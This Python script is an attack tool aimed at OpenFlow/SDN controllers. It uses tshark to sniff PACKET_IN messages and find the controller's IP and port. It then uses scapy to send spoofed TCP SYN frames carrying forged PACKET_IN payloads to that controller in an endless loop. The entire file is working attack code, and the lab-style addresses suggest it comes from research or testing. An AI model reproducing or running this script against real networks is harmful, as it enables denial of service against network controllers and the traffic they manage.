#!/usr/bin/env python

import subprocess
import re
from scapy.all import *
from scapy.contrib.openflow3 import OFPTPacketIn
import time

def run_tshark():
    """Runs tshark to capture OpenFlow messages and saves output to a file."""
    tshark_cmd = [
        'sudo', 'timeout', '15', 'tshark', '-i', 'ens33', '-Y', 'openflow_v4.type == 10',  # Filter for PACKET_IN
        '-O', 'openflow_v4'
    ]

    with open('tshark_output.txt', 'w') as file:
        process = subprocess.Popen(tshark_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        file.write(stdout.decode())

def extract_packet_in_info(file_path):
    """Extracts OFPT_PACKET_IN message details (Src IP and Dst Port) from tshark output."""
    with open(file_path, 'r') as file:
        output = file.read()

    # Regular expression to match Dst IP and Dst Port in PACKET_IN messages for the specified subnet
    pattern = re.compile(
        r'Internet Protocol Version 4, Src: (10\.100\.100\.\d+), Dst: (10\.100\.100\.\d+).*?Dst Port: (\d+)', re.DOTALL
    )
    matches = pattern.findall(output)

    # Store unique IP-port combinations
    controller_connections = set(matches)
    return controller_connections

def controllerinfo():
    """Main function to run tshark, extract PACKET_IN messages, and print the results."""
    run_tshark()
    connections = extract_packet_in_info('tshark_output.txt')

    if connections:
        print("Found the following OFPT_PACKET_IN messages:")
        for src_ip, dst_ip, port in connections:
            print("Controller IP: {}, Controller Port #: {}".format(dst_ip, port))
    else:
        print("No OFPT_PACKET_IN messages found.")

def attack():
    targetinfo = extract_packet_in_info('tshark_output.txt')
    for src_ip, dst_ip, port in targetinfo:
        # Define Ethernet layer
        print("Starting attack...")
        eth = Ether(src="00:0c:29:c2:b0:96", dst="00:0c:29:4c:73:95")

        try:
            while True:
                # Create an IP/TCP packet with a random source port
                ip = IP(src=src_ip, dst=dst_ip) / TCP(sport=RandShort(), dport=int(port), flags='S')

                # Create the OpenFlow Packet In message
                packet_in = OFPTPacketIn(
                    version=0x04,
                    type=10,
                    xid=1,
                    buffer_id=4294967295,
                    total_len=0,
                    reason=1,
                    table_id=0,
                    cookie=0,
                )

                # Build the packet
                payload = eth / ip / packet_in

                # Display the packet
                #payload.show()

                # Send the packet (e.g., to an OpenFlow controller)
                sendp(payload, iface="ens33", verbose=True)

                print("Packet sent")

                # Sleep for a short duration to avoid flooding
                time.sleep(0.1)

        except KeyboardInterrupt:
            print("\nPacket sending stopped by user.")

        print("Exiting script.")

if __name__ == "__main__":
    controllerinfo()
    attack()
